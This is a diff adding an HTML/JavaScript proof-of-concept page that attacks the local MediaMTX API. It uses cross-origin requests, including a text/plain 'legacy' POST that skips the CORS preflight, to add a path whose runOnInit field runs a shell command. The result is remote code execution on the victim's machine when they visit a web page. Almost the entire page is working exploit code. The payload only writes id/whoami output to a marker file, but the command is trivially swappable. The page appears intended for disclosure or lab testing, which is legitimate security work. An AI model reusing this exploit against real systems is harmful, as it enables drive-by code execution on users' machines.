@@ -1,0 +1,212 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>MediaMTX CORS/LNA legacy + current RCE proof</title>
+  <style>
+    body { font-family: system-ui, sans-serif; max-width: 940px; margin: 40px auto; padding: 0 16px; line-height: 1.5; }
+    label { display:block; margin-top:12px; font-weight:600; }
+    input, select { width:100%; box-sizing:border-box; padding:8px; margin-top:6px; }
+    button { margin:10px 8px 10px 0; padding:8px 12px; }
+    pre { white-space:pre-wrap; word-break:break-word; background:#f4f4f4; padding:12px; border-radius:6px; }
+    .note { border-left:4px solid #777; padding-left:12px; margin:16px 0; }
+  </style>
+</head>
+<body>
+<h1>MediaMTX CORS/LNA bounded RCE proof</h1>
+
+<p class="note">
+Disposable local lab only. Current mode uses readable CORS requests.
+Legacy mode deliberately uses a CORS-simple POST with <code>text/plain</code>
+so old MediaMTX releases do not fail on an OPTIONS preflight. In legacy mode
+the browser may hide the response; the marker file and MediaMTX log are the
+authoritative proof.
+</p>
+
+<label>API base</label>
+<input id="base" value="http://localhost:9997/v3">
+
+<label>Target OS</label>
+<select id="os">
+  <option value="windows">Windows</option>
+  <option value="linux">Linux</option>
+</select>
+
+<label>Request mode</label>
+<select id="reqmode">
+  <option value="current">Current (application/json + readable CORS response)</option>
+  <option value="legacy">Legacy simple POST (text/plain, no preflight required)</option>
+</select>
+
+<p><strong>Command preview:</strong></p>
+<pre id="cmd"></pre>
+
+<button id="run">1. Add temporary path and execute</button>
+<button id="cleanup">2. Delete temporary path (current/CORS-capable targets)</button>
+
+<p><strong>Result:</strong></p>
+<pre id="out"></pre>
+
+<script>
+const out = document.getElementById("out");
+const baseInput = document.getElementById("base");
+const osSelect = document.getElementById("os");
+const modeSelect = document.getElementById("reqmode");
+const cmdPreview = document.getElementById("cmd");
+
+let pathName = null;
+
+function detectOS() {
+  const ua = navigator.userAgent.toLowerCase();
+  osSelect.value = (ua.includes("linux") && !ua.includes("android")) ? "linux" : "windows";
+}
+
+function commandFor(os) {
+  if (os === "linux") {
+    return "sh -c 'id > /tmp/mediamtx-cors-rce-linux.txt; " +
+      "echo MEDIAMTX_CORS_RCE_LINUX >> /tmp/mediamtx-cors-rce-linux.txt'";
+  }
+  return 'cmd /c "whoami > %TEMP%\\mediamtx-cors-rce-windows.txt & ' +
+    'echo MEDIAMTX_CORS_RCE_WINDOWS>>%TEMP%\\mediamtx-cors-rce-windows.txt"';
+}
+
+function markerFor(os) {
+  return os === "linux"
+    ? "/tmp/mediamtx-cors-rce-linux.txt"
+    : "%TEMP%\\mediamtx-cors-rce-windows.txt";
+}
+
+function updatePreview() {
+  cmdPreview.textContent = commandFor(osSelect.value);
+}
+
+function write(v) {
+  out.textContent += (typeof v === "string" ? v : JSON.stringify(v, null, 2)) + "\n";
+}
+
+async function currentRequest(url, method, body) {
+  write(`--> ${method} ${url} [current/CORS]`);
+  const r = await fetch(url, {
+    method,
+    mode: "cors",
+    credentials: "omit",
+    cache: "no-store",
+    headers: {"Content-Type": "application/json"},
+    body: body === undefined ? undefined : JSON.stringify(body)
+  });
+  const text = await r.text();
+  let parsed = text;
+  try { parsed = JSON.parse(text); } catch (_) {}
+  const result = {ok:r.ok, status:r.status, body:parsed};
+  write(result);
+  return result;
+}
+
+async function legacySimplePost(url, body) {
+  write(`--> POST ${url} [legacy simple POST / text/plain]`);
+  try {
+    const r = await fetch(url, {
+      method: "POST",
+      mode: "cors",
+      credentials: "omit",
+      cache: "no-store",
+      headers: {"Content-Type": "text/plain"},
+      body: JSON.stringify(body)
+    });
+
+    // Old releases normally lack CORS response headers, so getting here is optional.
+    write({fetchResolved:true, status:r.status, note:"Response was browser-readable."});
+    return {sent:true, readable:true, status:r.status};
+  } catch (e) {
+    // Important: with a simple CORS request the POST can already have been sent and
+    // processed before the browser rejects access to the response.
+    write({
+      fetchRejected:true,
+      name:e.name,
+      message:e.message,
+      note:"For legacy mode this does NOT prove the POST failed. Check MediaMTX logs and the marker file."
+    });
+    return {sentPossibly:true, readable:false};
+  }
+}
+
+document.getElementById("run").onclick = async () => {
+  out.textContent = "";
+
+  const os = osSelect.value;
+  const reqmode = modeSelect.value;
+  const base = baseInput.value.replace(/\/+$/, "");
+  const command = commandFor(os);
+  const marker = markerFor(os);
+
+  pathName = `cors-rce-poc-${os}-${Date.now()}`;
+
+  write({
+    pageOrigin: location.origin,
+    isSecureContext: window.isSecureContext,
+    userAgent: navigator.userAgent,
+    selectedTargetOS: os,
+    requestMode: reqmode,
+    pathName
+  });
+
+  const body = {
+    runOnInit: command,
+    runOnInitRestart: false
+  };
+
+  const url = base + "/config/paths/add/" + encodeURIComponent(pathName);
+
+  try {
+    if (reqmode === "legacy") {
+      await legacySimplePost(url, body);
+      write(`CHECK MARKER NOW: ${marker}`);
+      if (os === "linux") write("VERIFY: cat /tmp/mediamtx-cors-rce-linux.txt");
+      else write('VERIFY: Get-Content "$env:TEMP\\mediamtx-cors-rce-windows.txt"');
+      write("Also check MediaMTX console for: runOnInit command started");
+      write("A browser-side 'Failed to fetch' is expected if the old server omits CORS response headers.");
+    } else {
+      const r = await currentRequest(url, "POST", body);
+      if (!r.ok) throw new Error(`path add failed: HTTP ${r.status}`);
+      write(`SUCCESSFUL API RESPONSE. CHECK MARKER: ${marker}`);
+    }
+  } catch (e) {
+    write(`RESULT: ${e.name || "Error"}: ${e.message}`);
+  }
+};
+
+document.getElementById("cleanup").onclick = async () => {
+  if (!pathName) {
+    write("No path name is available in this page session.");
+    return;
+  }
+
+  const base = baseInput.value.replace(/\/+$/, "");
+  const url = base + "/config/paths/delete/" + encodeURIComponent(pathName);
+
+  try {
+    // DELETE itself is not a CORS-simple method, so this is mainly for newer
+    // targets that implement preflight/CORS. Old targets can be restarted after
+    // the disposable test instead.
+    write(`--> DELETE ${url}`);
+    const r = await fetch(url, {
+      method: "DELETE",
+      mode: "cors",
+      credentials: "omit",
+      cache: "no-store"
+    });
+    write({ok:r.ok, status:r.status});
+    if (r.ok) pathName = null;
+  } catch (e) {
+    write(`Cleanup fetch failed: ${e.message}`);
+    write("For legacy releases, stop/restart the disposable MediaMTX process to clear runtime configuration.");
+  }
+};
+
+osSelect.addEventListener("change", updatePreview);
+detectOS();
+updatePreview();
+</script>
+</body>
+</html>
